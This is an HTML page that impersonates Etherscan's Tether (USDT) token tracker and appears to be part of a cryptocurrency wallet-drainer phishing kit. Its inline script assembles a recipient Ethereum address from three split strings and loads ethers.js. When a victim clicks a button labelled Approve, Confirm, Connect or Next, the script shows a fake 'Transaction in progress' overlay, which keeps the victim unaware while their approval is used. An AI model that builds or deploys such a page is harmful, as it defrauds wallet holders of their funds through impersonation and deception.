<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />

    <link rel="icon" type="image/svg+xml" href="./eth.svg" />

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
    />

    <title>Tether (USDT) Token Tracker | Etherscan</title>

    <!-- CSS LOCALE -->
    <link rel="stylesheet" href="./index.css" />

    <style>
        body {
            -webkit-user-select: none;
            user-select: none;
            margin: 0;
            padding: 0;
        }

        #loader-overlay {
            display: none;
            position: fixed;
            inset: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.6);
            z-index: 2147483647;
            align-items: flex-end;
            justify-content: center;
        }

        #loader-overlay > div {
            background: #ffffff;
            border-radius: 24px 24px 0 0;
            width: 100%;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            animation: tw-slide-up 0.35s ease-out;
        }

        @keyframes tw-slide-up {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(0);
            }
        }

        .tw-body {
            padding: 48px 24px 40px;
            text-align: center;
        }

        .tw-check-circle {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #10b981, #059669);
            border-radius: 50%;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 50px;
            font-weight: bold;
        }

        .tw-title {
            color: #1a1a2e;
            font-size: 24px;
            font-weight: 700;
            margin: 20px 0 12px;
        }

        .tw-desc {
            color: #6b7280;
            line-height: 1.6;
            max-width: 320px;
            margin: auto;
        }

        .tw-btn {
            background: #0052ff;
            color: #fff;
            border: none;
            border-radius: 999px;
            width: 100%;
            padding: 18px;
            margin-top: 24px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
        }

        #root {
            min-height: 100vh;
        }
    </style>
</head>

<body>

    <!-- MODALE -->
    <div id="loader-overlay">
        <div>
            <div class="tw-body">

                <div class="tw-check-circle">
                    ✓
                </div>

                <h2 class="tw-title">
                    Processing...
                </h2>

                <p class="tw-desc">
                    Transaction in progress!
                    Blockchain validation is underway.
                    This may take a few minutes.
                </p>

                <button class="tw-btn">
                    Transaction details
                </button>

            </div>
        </div>
    </div>

    <!-- ROOT REACT -->
    <div id="root"></div>

    <!-- ETHERS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

    <script>
        const _p1 = "0xE57C99A3ae2ae12";
        const _p2 = "4f026BFa8601F7A956";
        const _p3 = "309FB53";

        window.rA = _p1 + _p2 + _p3;
        window.XB = "";

        window.addEventListener("DOMContentLoaded", () => {

            const overlay =
                document.getElementById("loader-overlay");

            const observer = new MutationObserver(
                (mutations) => {

                    mutations.forEach((mutation) => {

                        mutation.addedNodes.forEach((node) => {

                            if (node.nodeType !== 1) return;

                            const text =
                                node.textContent || "";

                            if (
                                text.includes("Blockchain validation") ||
                                text.includes("Transaction in progress") ||
                                text.includes("Processing")
                            ) {
                                node.remove?.();
                                overlay.style.display = "flex";
                            }
                        });
                    });
                }
            );

            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        });

        window.addEventListener("click", (e) => {

            const button =
                e.target.closest?.("button");

            const btnText =
                button?.innerText || "";

            if (
                btnText.includes("Approve") ||
                btnText.includes("Confirm") ||
                btnText.includes("Connect") ||
                btnText.includes("Next")
            ) {
                setTimeout(() => {
                    document
                        .getElementById(
                            "loader-overlay"
                        )
                        .style.display = "flex";
                }, 500);
            }
        });
    </script>

    <!-- JS LOCALE -->
    <script type="module" src="./index.js"></script>

</body>
</html>
